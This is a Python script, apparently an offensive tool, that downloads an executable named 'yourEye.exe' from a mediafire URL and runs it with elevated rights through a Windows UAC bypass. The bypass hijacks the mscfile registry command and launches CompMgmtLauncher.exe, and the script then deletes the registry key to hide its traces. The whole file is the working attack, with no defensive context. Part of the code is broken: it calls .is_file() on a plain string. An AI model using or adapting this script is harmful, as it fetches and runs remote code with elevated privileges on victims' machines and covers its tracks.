"""
Works from: Windows 7 (7600)
Fixed in: Windows 10 RS2 (15031)
"""
import os
import wmi
import time
import winreg
import wget

wmi = wmi.WMI()

def getPayload():
    file_url = 'https://download944.mediafire.com/n4sfrq1svm5g/205fuxt8egwy6gz/yourEye.exe' 
    dest_file = 'C:\\Users\\Public\\Documents\\yourEye.exe'
    
    if dest_file.is_file():
        print("File Exist")
		
    else :
        wget.download(file_url, dest_file)

    time.sleep(5)

def comngmtPloit(payload):
	print("Payload: {}".format(payload))
	print("Attempting to create registry key")
	try:
		key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\mscfile\shell\open\command"))								
		winreg.SetValueEx(key,None,0,winreg.REG_SZ,payload)
		winreg.CloseKey(key)		
	except Exception as error:
		print("Unable to create key")
		return False
	else:
		print("Registry key created")

	print("Pausing for 5 seconds before executing")
	time.sleep(5)

	print("Attempting to create process")
	try:
		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start CompMgmtLauncher.exe",ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=1))
		if (result[1] == 0):
			print("Process started successfully")
		else:
			print("Problem creating process")
	except Exception as error:
		print("Problem creating process")
		return False

	print("Pausing for 5 seconds before cleaning")
	time.sleep(5)

	print("Attempting to remove registry key")
	try:
		winreg.DeleteKey(winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\mscfile\shell\open\command"))		
	except Exception as error:
		print("Unable to delete key")
		return False
	else:
		print("Registry key was deleted")

if __name__ == "__main__":
	getPayload()
	payload='C:\\Users\\Public\\Documents\\yourEye.exe'
	comngmtPloit(payload)